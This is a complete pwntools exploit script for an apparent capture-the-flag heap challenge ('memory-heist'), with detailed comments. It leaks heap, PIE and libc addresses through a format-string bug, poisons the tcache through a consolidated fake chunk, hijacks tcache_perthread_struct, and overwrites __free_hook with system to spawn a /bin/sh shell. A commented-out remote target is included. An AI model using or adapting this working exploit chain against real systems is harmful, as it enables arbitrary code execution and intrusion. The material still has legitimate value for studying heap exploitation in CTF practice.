from pwn import *

binary = "./memory-heist"
#script = '''
#
#b *main-0x5f 
#'''

# muh debugging
def attach_stop(p):
    gdb.attach(p)
    raw_input()

# allocate a chunk
def alloc(idx,size,data):
    p.sendlineafter('> ','1')
    p.sendlineafter('> ',str(idx))
    p.sendlineafter('> ',str(size))
    p.sendafter('Memory> ',data)

# free a chunk
def sice(idx):
    p.sendlineafter('> ','2')
    p.sendlineafter('> ', str(idx))

# view a chunk - this also wipes out half of our `chunks` array
def view(idx,kek):
    p.sendlineafter('> ','3')
    p.sendlineafter('[Y/N]> ',kek)
    p.sendlineafter('> ',str(idx))
    return p.recvline().split(b':')[1]

# start
if __name__ == "__main__":
    p = process(binary)
    #p = remote('35.244.10.136', 10253)
    
    # This section is used to construct a free unsortedbin chunk '7' that will be used later for consolidation with other chunks.
    alloc(1, 0x208,'hk')    # not consolidated - will be overwritten + lost. This isn't used for anything else.
    
    # Will be placed in unsorted-bin. This is very, very important since any other type of chunk cannot we re-used as easily 
    #  and be used by nearby free chunks. Which is something we need to happen. (consolidation)
    alloc(7, 0x2000,'hk') # for consoliation, is size arbitrary? Sort of.

    # Stops consolidation beyond this point (tcache is never consolidated). This chunk will also be used to ensure that
    # at least 2 chunks reside in the tcache later.
    alloc(9, 0x100, 'HKHK') # not consoldiated - read above
    
    # Used for our leaks
    alloc(11, 0x100, '%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p') # leaky chunk
    #attach_stop(p) 
    #    Free chunk (unsortedbin) | PREV_INUSE
    #    Addr: 0x5624fdace4b0
    #    Size: 0x2011 
    #    fd: 0x7f7ebce2bbe0
    #    bk: 0x7f7ebce2bbe0
    sice(7)

    #attach_stop(p)
    sice(9) # tcache
    
    # Now we use chunk 11 + the format vuln to leak some ptrs. Leaks from internal rsp:
    #00:0000│ rsp  0x7ffea81c3040 —▸ 0x5629ad7d01b0 (_start) ◂— endbr64 
    #01:0008│      0x7ffea81c3048 ◂— 0xb /* '\x0b' */
    #02:0010│      0x7ffea81c3050 ◂— 0x1
    #03:0018│      0x7ffea81c3058 —▸ 0x5629aef35605 ◂— 0x0
    #04:0020│      0x7ffea81c3060 ◂— 0xa61 /* 'a\n' */
    #05:0028│      0x7ffea81c3068 ◂— 0x2e2f4ca7c4a95d00
    #06:0030│ rbp  0x7ffea81c3070 —▸ 0x7ffea81c3090 ◂— 0x0
    #07:0038│      0x7ffea81c3078 —▸ 0x5629ad7d08b7 (main+108) ◂— jmp    0x5629ad7d08cf
    # This process also whipes our over hapf of our allocations, meaning most have been overwritten by this point.
    leaks = view(11,'a').strip()
    print(leaks.split(b'0x'))
    heap_base = (int(b'0x' + leaks.split(b'0x')[8],0)&0xfffffffffffff000) - 0x2000
    pie_base = int(b'0x' + leaks.split(b'0x')[5],0) - 0x11b0
    libc_base = int(b'0x' + leaks.split(b'0x')[15],0) - 0x270b3
    print(f'Heap base: {hex(heap_base)}')
    print(f'Pie leak: {hex(pie_base)}')
    print(f'Libc base: {hex(libc_base)}')

    # 2 more largebin chunks... Allocating these will take away 0x500 from '7' each time, this can happen as 0 and 2 are
    # adjacent to the '7' chunk:
    #
    #   Allocated chunk | PREV_INUSE
    #   Addr: 0x557b358bb4b0
    #   Size: 0x511
    #   
    #   Allocated chunk | PREV_INUSE
    #   Addr: 0x557b358bb9c0
    #   Size: 0x511
    #   
    #   Free chunk (unsortedbin) | PREV_INUSE
    #   Addr: 0x557b358bbed0
    #   Size: 0x15f1
    #   fd: 0x7effd671dbe0
    #   bk: 0x7effd671dbe0

    alloc(0, 0x500, 'hk')
    alloc(2, 0x500, 'hk')
    #attach_stop(p)
    # Then free'ing them will add them back together with chunk 7, but storing references to each chunk as well.
     
    # Free them both - these will be consolidated back with chunk 7 which is free, however the new pointer for this big chunk
    # will be stored at '0' since that is where the consolidation will start (0 was allocated first). This means that we now
    # have chunk pointers stored that refer INSIDE chunk 7
    #attach_stop(p)
    sice(0)
    sice(2)
    
    #attach_stop(p)

    # This will give us chunk 7 back, this is because the size of allocations 3, 5, and 7 once consolidated will result in a size 
    # of 0x2000. This changes the size for the stored chunk, 2.
    # This constructs a fake set of chunks inside '4'. Basically looks like this:
    #a1:0508│   0x55e8a15dc9c8 ◂— 0x111             <------ this - 8 is the pointer to chunk 2. 
    #a2:0510│   0x55e8a15dc9d0 ◂— 0x4141414141414141 ('AAAAAAAA') <-- contents dont matter
    #... ↓
    #c3:0618│   0x55e8a15dcad8 ◂— 0x21 /* '!' */    <------ in order to make it look authentic, we have another chunk
    #c4:0620│   0x55e8a15dcae0 ◂— 0x0                       at 2+size. This will bypass any free() protection and allow us
    #                                                       to construct a fake chunk, 2
    alloc(4, 0x2000, b'A'*0x508 + p64(0x111) )#+ b'A'*0x108 + p64(0x21))

    # Now that we have constructed the fake chunks, we can free them again and have them added to the corresponding bin.
    # (2 will go in tcache), next to our old chunk '9' which we allocated earlier. 
    sice(2)
    sice(0)
    
    # Chunk 2 is now a valid tcache chunk, and looks like this:
    # 0: 0x4141414141414141      0x0000000000000111 <----- faked size
    # 16: 0x00005600daad54d0      0x00005600daad3010 <------ pointer back to `entries`
    #       ^ points to chunk 9, next in 0x100 bin.
    # This is good for us because now chunk 2, which is free is located inside chunk 0. This means if we decide to use 0 again
    # we can overwrite 2's metadata:
    alloc(6, 0x2000, b'A'*0x508 + p64(0x111) + p64(pie_base + 0x4060))
    # 2 now has the 'next' ptr that points into the `chunks` array, in the .bss:
    #
    #   tcachebins 0x110 [  2]: 0x55734ce7f9d0 —▸ 0x55734c71a060 (chunks) —▸ 0x55734ce7f4c0 ◂— ...
    #
    # We can see that the first element of chunks is our idx 0 allocation, which is correct.
    # Next, we consume one entry from our corrupted tcache:
    alloc(8, 0x100, b'A')
    
    #attach_stop(p)

    # Now the next entry in our tcache is the chunks array ;)))))
    #
    #   tcachebins 0x110 [  1]: 0x5559267b4060 (chunks) —▸ 0x5559277bb4c0 ◂— ...
    #
    # This means the next allocation that is below 0x110 will recieve the chunks array. Additionally
    # there is a check in delete() that checks if we have overwrote the __free_hook. In order to bypass this
    # we overwrite the pointer with a null pointer so it believes that nothing has changed, thus we are still
    # able to call free() with a modified hook when the time comes.
    alloc(10, 0x100, p64(heap_base + 0x10) + p64(0)*11 + p64(heap_base + 0x400))
    
    # We use this ability to overwrite the entire chunks array:
    #                                           V idx '0' now points to the first chunk on the heap - this is where the tcache 
    #                                             `tcache_perthread_struct` struct is stored.
    #    0x5577491b2060 <chunks>:        0x000055774ad5b010      0x0000000000000000
    #    0x5577491b2070 <chunks+16>:     0x0000000000000000      0x0000000000000000
    #    0x5577491b2080 <chunks+32>:     0x0000000000000000      0x0000000000000000
    #    0x5577491b2090 <chunks+48>:     0x0000000000000000      0x0000000000000000
    #    0x5577491b20a0 <chunks+64>:     0x0000000000000000      0x0000000000000000
    #    0x5577491b20b0 <chunks+80>:     0x0000000000000000      0x0000000000000000
    #    0x5577491b20c0 <free_hook>:     0x000055774ad5b400 <------ we also overwrite a copy of the __free_hook.
    
    # Now, when we free 0, this will make the actual `tcahe_perthreadd_struct` struct available, thus enabling the person with 
    #control over the allocation to make any number of fake tcache bins, with fake entries inside them. Basically we win.
    sice(0)
    
    # Heres what `tcache_perthread_struct` looks like after that free():
    #    {
    #      counts = {0, 0, 0, 0, 8208, 34189, 22038, 0 <repeats 32 times>, 1, 0 <repeats 24 times>},
    #      entries = {0x0 <repeats 15 times>, 0x5616858d24c0, 0x0 <repeats 23 times>, 0x5616858d2010, 0x0 <repeats 24 times>}
    #    }
    # Pretty fucked up, huh?
    
    # We now overwrite the entries of the first bin, with the __morecore_hook address in libc.
    # This means that the next allocation that takes from bin one (size 16) will recieve a chunk @ __morecore_hook.
    # '\1'*0x80 to overwrite `counts`, then the addr will overwrite the first entry in `entries`
    # Size needs to be what it is bcuz the perthread struct chunk IS a certain size.
    #alloc(1, 0x288-2, b'\1'*0x80 + p64(libc_base + 0x1eeb20))
    alloc(1, 0x280, b'\1'*0x80 + p64(libc_base + 0x1eeb20))
    
    #    pwndbg> x/13gx &chunks
    #    0x55f25ba51060 <chunks>:        0x000055f25c522010      0x000055f25c522010
    #    0x55f25ba51070 <chunks+16>:     0x00007fe975d54b20      0x0000000000000000
    #    0x55f25ba51080 <chunks+32>:     0x0000000000000000      0x0000000000000000
    #    0x55f25ba51090 <chunks+48>:     0x0000000000000000      0x0000000000000000
    #    0x55f25ba510a0 <chunks+64>:     0x0000000000000000      0x0000000000000000
    #    0x55f25ba510b0 <chunks+80>:     0x0000000000000000      0x0000000000000000
    #    0x55f25ba510c0 <free_hook>:     0x000055f25c522400
    #    pwndbg> x/2gx 0x00007fe975d54b20
    #    0x7fe975d54b20 <__after_morecore_hook>: 0x0068732f6e69622f      0x00007fe975bbb410
    #    pwndbg> x/gx 0x7fe975d54b20+8
    #    0x7fe975d54b28 <__free_hook>:   0x00007fe975bbb410
    #    pwndbg> 

    # Now we write b'/bin/sh\0' into __after_morecore_hook. And at __after_moercore_hook+8 (__free_hook) we place __libc_system. 
    #Now when we free(chunks[2]) we will be doing free('/bin/sh\0');, and since we overwrite __free_hook we will call 
    # system('/bin/sh');
    alloc(2, 0x16, b'/bin/sh\0'+p64(libc_base + 0x55410))
    # Do it xPPPP
    sice(2)
    p.interactive()
